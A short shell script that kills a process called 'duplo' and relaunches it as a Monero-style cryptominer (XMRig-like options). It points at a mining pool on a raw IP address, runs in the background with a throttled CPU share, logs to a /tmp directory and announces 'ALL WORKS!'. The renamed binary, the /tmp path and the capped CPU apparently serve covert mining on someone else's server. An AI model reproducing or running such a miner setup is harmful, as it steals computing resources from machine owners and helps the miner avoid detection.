pkill duplo
duplo -o 95.216.214.224:55885 -u $WALLET --pass=$PASSWORD --rig-id=$ID -B -l /tmp/server11/duplo.log --donate-level=1 --print-time=40 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=58 --av=1 --variant -1
echo -e 'ALL WORKS! tail -f /tmp/server11/duplo.log'
